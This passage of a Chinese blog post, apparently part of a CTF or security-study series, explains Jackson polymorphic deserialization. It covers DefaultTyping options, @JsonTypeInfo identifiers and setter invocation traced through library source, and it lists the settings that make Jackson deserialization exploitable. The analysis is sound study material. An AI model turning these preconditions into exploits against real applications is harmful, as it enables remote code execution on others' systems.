+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206164412686.png" alt="image-20251206164412686"></p>
+<p>开启之后</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206164459610.png" alt="image-20251206164459610"></p>
+<h3 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h3><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除<code>final</code>外的属性信息都需要被序列化和反序列化。</p>
+<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>其实这几个选项是从上至下逐渐扩大适用范围的，例如我这里借师傅文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12412%E7%9A%84%E8%A1%A8">https://xz.aliyun.com/news/12412的表</a></p>
+<table>
+<thead>
+<tr>
+<th><strong>DefaultTyping类型</strong></th>
+<th><strong>描述说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JAVA_LANG_OBJECT</td>
+<td>属性的类型为Object</td>
+</tr>
+<tr>
+<td>OBJECT_AND_NON_CONCRETE</td>
+<td>属性的类型为Object、Interface、AbstractClass</td>
+</tr>
+<tr>
+<td>NON_CONCRETE_AND_ARRAYS</td>
+<td>属性的类型为Object、Interface、AbstractClass、Array</td>
+</tr>
+<tr>
+<td>NON_FINAL</td>
+<td>所有除了声明为final之外的属性</td>
+</tr>
+</tbody></table>
+<p>还有一个EVERYTHING，我们也讲一下</p>
+<h3 id="EVERYTHING"><a href="#EVERYTHING" class="headerlink" title="EVERYTHING"></a>EVERYTHING</h3><p><code>EVERYTHING</code>是 Jackson 2.10 (2019年发布) 引入的第 5 个选项，是用来专门处理带final修饰符修饰的类</p>
+<p>将User类加上final修饰符进行修饰并进行序列化和反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.EVERYTHING);  <span class="comment">//无参数开启OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------反序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.readValue(json, User.class);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206165047687.png" alt="image-20251206165047687"></p>
+<h2 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h2><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.DEDUCTION)</span></span><br></pre></td></tr></table></figure>
+
+<p>说白了就是给类中的属性添加注解</p>
+<h3 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h3><p>用于指定在序列化和反序列化过程中不包含任何类型标识 不使用识别码</p>
+<p>写一个TestUser类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JsonTypeInfo(use=JsonTypeInfo.Id.NONE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;testname&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>写个测试类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(a);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestUser</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206173431967.png" alt="image-20251206173431967"></p>
+<p>和没用注解的时候是一样的</p>
+<p>这里的话其实分两种，一种是在类上，一种是在字段上：</p>
+<p>在类上相当于给这个类打上一个标签，无论这个类在哪被使用，Jackson 都会应用这个规则。</p>
+<p>而在字段上相对来说会更灵活，它控制的是“容器”的行为，其优先级是最高的。</p>
+<p>例如把标签打在A类的object字段上而非TetsUser类上</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use=JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestUser</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时只有在这个 object字段上，强制禁用类型标识，起到一个局部生效的效果而不会影响对应类本身</p>
+<h3 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h3><p>使用完全限定类名做识别</p>
+<p>将注解改成JsonTypeInfo.Id.CLASS再运行看看</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206174557732.png" alt="image-20251206174557732"></p>
+<p>可以看到此时多了一个全限定类名信息，并且反序列化的时候object属性也是具体的TestUser类对象，所以该注解能成功对指定类型进行序列化和反序列化</p>
+<p>乍一看发现，好像和Fastjson中的<code>@type</code>注解有点像，如果在Jackson反序列化的时候使用了JsonTypeInfo.Id.CLASS注解修饰的话，我们貌似可以通过@class的方式指定相关类进行相关调用？</p>
+<h3 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h3><p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206174959993.png" alt="image-20251206174959993"></p>
+<p>@c<code>替代了</code>@class，看起来就是将上面的@class的形式给简写了，按照官方的描述是缩短了相关类名：<a target="_blank" rel="noopener" href="https://github.com/FasterXML/jackson-annotations">https://github.com/FasterXML/jackson-annotations</a></p>
+<p>不过效果和JsonTypeInfo.Id.CLASS是差不多的，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用。</p>
+<h3 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h3><p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206175324839.png" alt="image-20251206175324839"></p>
+<p>在反序列化的时候报错了，输出可以看到，object属性中多了@type但去掉了指定类的具体包名，因此在后续的反序列化会因为找不到相关类而报错，也就是说这个设置值是不能被反序列化利用的。</p>
+<h3 id="JsonTypeInfo-Id-COSTOM"><a href="#JsonTypeInfo-Id-COSTOM" class="headerlink" title="JsonTypeInfo.Id.COSTOM"></a>JsonTypeInfo.Id.COSTOM</h3><p>用户自定义识别码，由@JsonTypeIdResolver对应，但是需要用户自己写一个解析器并配合@JsonTypeIdResolver使用来决定如何处理类</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206180217853.png" alt="image-20251206180217853"></p>
+<p>手动写一个解析器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.DatabindContext;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.JavaType;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.jsontype.impl.TypeIdResolverBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyCustomResolver</span> <span class="keyword">extends</span> <span class="title class_">TypeIdResolverBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JsonTypeInfo.Id <span class="title function_">getMechanism</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JsonTypeInfo.Id.CUSTOM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【序列化调用】 Java Object -&gt; JSON String</span></span><br><span class="line">    <span class="comment">// 决定 JSON 中那个 property 字段的值是什么</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">idFromValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> idFromValueAndType(value, value.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">idFromValueAndType</span><span class="params">(Object value, Class&lt;?&gt; suggestedType)</span> &#123;</span><br><span class="line">        <span class="comment">// 自定义逻辑：给类名加上前缀</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TEST_&quot;</span> + suggestedType.getSimpleName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【反序列化调用】 JSON String -&gt; Java Type</span></span><br><span class="line">    <span class="comment">// 核心安全点：这里决定了能不能把字符串转成类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JavaType <span class="title function_">typeFromId</span><span class="params">(DatabindContext context, String id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Custom Resolver resolving ID: &quot;</span> + id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;TEST_TestUser&quot;</span>.equals(id)) &#123;</span><br><span class="line">            <span class="keyword">return</span> context.constructType(TestUser.class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JsonTypeInfo-Id-DEDUCTION"><a href="#JsonTypeInfo-Id-DEDUCTION" class="headerlink" title="JsonTypeInfo.Id.DEDUCTION"></a>JsonTypeInfo.Id.DEDUCTION</h3><p>其核心逻辑为（Type Deduction based on property existence），不需要任何显式的类型字段（如 @class、type 等），Jackson 会检查 JSON 里有哪些字段，然后对比各个子类的定义，进行调用</p>
+<h2 id="最终得到的利用条件"><a href="#最终得到的利用条件" class="headerlink" title="最终得到的利用条件"></a>最终得到的利用条件</h2><p>经过上面的测试和分析可以看出，可以触发Jackson反序列化漏洞的情况：</p>
+<ul>
+<li>使用enableDefaultTyping()设置DefaultTyping的值</li>
+<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS)</li>
+<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS)</li>
+</ul>
+<p>把@JsonTypeInfo注解测试的时候用的TestUser类加上构造函数和setter和getter方法重新测一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestUser</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestUser</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了有参构造方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setName 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getName 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后测试类也修改一下</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206181701494.png" alt="image-20251206181701494"></p>
+<p>所以我们可以知道，在以上三种情况下进行Jackson反序列化的时候都会触发该属性的类的构造方法和setter方法，接下来我们分析一下为什么会触发setter方法</p>
+<h1 id="Jackson反序列化如何触发setter"><a href="#Jackson反序列化如何触发setter" class="headerlink" title="Jackson反序列化如何触发setter"></a>Jackson反序列化如何触发setter</h1><p>打个断点在readValue()调用处进行调试</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206182118166.png" alt="image-20251206182118166"></p>
+<p>先是进行一个空校验，检查JSON字符串content是否为null</p>
+<p><code>_typeFactory.constructType(valueType)</code>，Jackson把<code>Class&lt;T&gt;</code>转化成更高级的类型描述JavaType，然后进入readValue函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">readValue</span><span class="params">(String content, JavaType valueType)</span></span><br><span class="line">    <span class="keyword">throws</span> JsonProcessingException, JsonMappingException</span><br><span class="line">&#123;</span><br><span class="line">    _assertNotNull(<span class="string">&quot;content&quot;</span>, content);</span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="comment">// since 2.10 remove &quot;impossible&quot; IOException as per [databind#1675]</span></span><br><span class="line">        <span class="keyword">return</span> (T) _readMapAndClose(_jsonFactory.createParser(content), valueType);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123; <span class="comment">// shouldn&#x27;t really happen but being declared need to</span></span><br><span class="line">        <span class="keyword">throw</span> JsonMappingException.fromUnexpectedIOE(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>JsonFactory</code> 创建一个新的 JSON <strong>解析器</strong>并调用_readMapAndClose()方法将JSON内容“映射”成 <code>valueType</code> 对象，也就是把 JSON 字符串 变成 Jackson 能理解的 JsonToken 流，我们跟进看看</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">_readMapAndClose</span><span class="params">(JsonParser p0, JavaType valueType)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">JsonParser</span> <span class="variable">p</span> <span class="operator">=</span> p0) &#123;</span><br><span class="line">        <span class="keyword">final</span> Object result;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">DeserializationConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> getDeserializationConfig();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">DefaultDeserializationContext</span> <span class="variable">ctxt</span> <span class="operator">=</span> createDeserializationContext(p, cfg);</span><br><span class="line">        <span class="type">JsonToken</span> <span class="variable">t</span> <span class="operator">=</span> _initForReading(p, valueType);</span><br><span class="line">        <span class="keyword">if</span> (t == JsonToken.VALUE_NULL) &#123;</span><br><span class="line">            <span class="comment">// Ask JsonDeserializer what &#x27;null value&#x27; to use:</span></span><br><span class="line">            result = _findRootDeserializer(ctxt, valueType).getNullValue(ctxt);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (t == JsonToken.END_ARRAY || t == JsonToken.END_OBJECT) &#123;</span><br><span class="line">            result = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = ctxt.readRootValue(p, valueType,</span><br><span class="line">                    _findRootDeserializer(ctxt, valueType), <span class="literal">null</span>);</span><br><span class="line">            ctxt.checkUnresolvedObjectId();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cfg.isEnabled(DeserializationFeature.FAIL_ON_TRAILING_TOKENS)) &#123;</span><br><span class="line">            _verifyNoTrailingTokens(p, ctxt, valueType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取反序列化配置，然后创建反序列化上下文，检查 json 开头读取 token，如果不为 null 就获取反序列化器，再进行反序列化</p>
+<p>跟进readRootValue函数</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206182803426.png" alt="image-20251206182803426"></p>
+<p>检查是否开启了 UNWRAP_ROOT_VALUE 配置，默认是未启动的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(JsonParser p, DeserializationContext ctxt)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// common case first</span></span><br><span class="line">    <span class="keyword">if</span> (p.isExpectedStartObjectToken()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_vanillaProcessing) &#123;</span><br><span class="line">            <span class="keyword">return</span> vanillaDeserialize(p, ctxt, p.nextToken());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 23-Sep-2015, tatu: This is wrong at some many levels, but for now... it is</span></span><br><span class="line">        <span class="comment">//    what it is, including &quot;expected behavior&quot;.</span></span><br><span class="line">        p.nextToken();</span><br><span class="line">        <span class="keyword">if</span> (_objectIdReader != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> deserializeWithObjectId(p, ctxt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserializeFromObject(p, ctxt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _deserializeOther(p, ctxt, p.currentToken());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先是判断当前 token 是否是对象的开始标记，<code>_vanillaProcessing</code> 为 true采用简化的反序列化方法，如果 Bean 非常简单（没有自定义构造器、没有 @JsonIdentityInfo、没有复杂的继承关系），Jackson 就会把这个标记设为 true</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206183214392.png" alt="image-20251206183214392"></p>
+<p><code>final Object bean = _valueInstantiator.createUsingDefault(ctxt);</code>会调用对象的无参构造函数创建一个空的 Java 对象实例，再遍历JSON对象中的所有字段并设置值</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206184536612.png" alt="image-20251206184536612"></p>
+<p>检查JSON 指针是否指向 null 值，然后检查是否有多态配置，然后再反序列化</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206185138947.png" alt="image-20251206185138947"></p>
+<p>分别对数组和普通对象的JSON进行了相应的处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(JsonParser p, DeserializationContext ctxt)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (p.isExpectedStartObjectToken()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>._vanillaProcessing) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.vanillaDeserialize(p, ctxt, p.nextToken());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p.nextToken();</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>._objectIdReader != <span class="literal">null</span> ? <span class="built_in">this</span>.deserializeWithObjectId(p, ctxt) : <span class="built_in">this</span>.deserializeFromObject(p, ctxt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>._deserializeOther(p, ctxt, p.currentToken());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断 JsonParser 当前是否停在 JSON 对象的开始符号 START_OBJECT 上，然后检查 Bean 是否复杂进行分流</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">_deserializeOther</span><span class="params">(JsonParser p, DeserializationContext ctxt, JsonToken t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (t != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">            <span class="keyword">case</span> VALUE_STRING:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromString(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> VALUE_NUMBER_INT:</span><br><span class="line">                <span 